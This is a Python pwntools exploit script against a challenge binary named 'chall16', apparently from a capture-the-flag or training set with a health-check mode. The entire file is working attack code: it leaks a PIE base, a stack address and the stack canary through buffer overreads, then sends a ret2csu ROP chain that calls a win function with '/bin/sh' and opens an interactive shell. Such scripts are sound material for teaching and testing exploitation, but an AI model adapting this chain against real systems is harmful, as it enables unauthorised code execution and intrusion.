#!/usr/bin/env python3
from pwn import *
import sys
import time

HOST  = ''
PORT  = 40016

NUM_ATTEMPTS = 10

target_elf = ELF('../bin/chall16')

BASE  = 0xc1d
STACK = 0x130

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

def exploit_attempt():
    try:
        if len(HOST) > 0:
            io = remote(HOST, PORT, level='warn')
        else:
            io = target_elf.process(level='warn')

        sys.stdout.write(io.recvuntil(b'5!\n'))

        # step 1: leak PIE address
        io.sendline(b'x'*0x18)
        io.recvuntil(b'x'*0x18)
        leak = io.recvline().strip()
        leak = u64(leak.ljust(8, b'\x00'))
        base = leak - BASE

        log.info('Leak:      %#014x' % leak)
        log.info('Base:      %#014x' % base)

        # step 2: leak stack address
        io.sendline(b'x'*0x40)
        io.recvuntil(b'x'*0x40)
        leak = io.recvline().strip()
        leak = u64(leak.ljust(8, b'\x00'))

        stack = leak - STACK
        log.info('Stack:     %#014x' % stack)

        # step 3: leak canary
        io.sendline(b'x'*0x49)
        io.recvuntil(b'x'*0x49)
        canary = io.recvline().strip()[:7]
        canary = u64(canary.rjust(8, b'\x00'))

        log.info('Canary: %#014x' % canary)

        # step 4: rop time, using universal gadget to control rdx
        rop  = p64(base+0xc40)     # fini
        rop += p64(canary)         # canary
        rop += p64(0x00)           # rbp
        rop += p64(base+0xc26)     # universal gadget part 1
        rop += b'A'*8
        rop += p64(0x00)           # rbx
        rop += p64(0x01)           # rbp
        rop += p64(stack+0x40)     # r12 -> stack -> fini
        rop += p64(0x00)           # r13 -> rdi
        rop += p64(0x00)           # r14 -> rsi
        rop += b'S'*8              # r15 -> rdx
        rop += p64(base+0xc10)     # universal part 2
        rop += b'B'*8
        rop += p64(0x00)           # rbx
        rop += p64(base+0x202400)  # rbp
        rop += p64(0x00)           # r12
        rop += p64(0x00)           # r13
        rop += p64(0x00)           # r14
        rop += p64(0x00)           # r15
        rop += p64(base+0x9ac)     # win(0, 0, "/bin/sh")
        rop += p64(base+0xa3a)     # quit()

        rop  = rop.replace(b'SSSSSSSS', p64(stack+len(rop)+0x40))
        rop += b'/bin/sh\x00'

        io.recvuntil(b': ')
        io.sendline(cyclic(0x40) + rop)

        # step 5: trigger
        io.recvuntil(b'buffer: ')
        io.sendline(b'')

        # step 6: collect shell
        io.sendline(b'id')
        id_result = io.recvline()
        if b'uid=' in id_result:
            log.success('shell: %s', id_result.decode('ascii').strip())
            if not os.environ.get('HEALTH_CHECK', False):
                io.interactive()
            return True
        else:
            log.failure('Error: %s', id_result)
    except EOFError as e:
        log.failure('Fail: EOF')
    except Exception as e:
        log.failure('Error: %s: %s', type(e), str(e))
    finally:
        io.close()
    return False

if __name__ == '__main__':
    for _ in range(NUM_ATTEMPTS):
        if exploit_attempt():
            sys.exit(0)
        sleep(0.1)
    sys.exit(1)
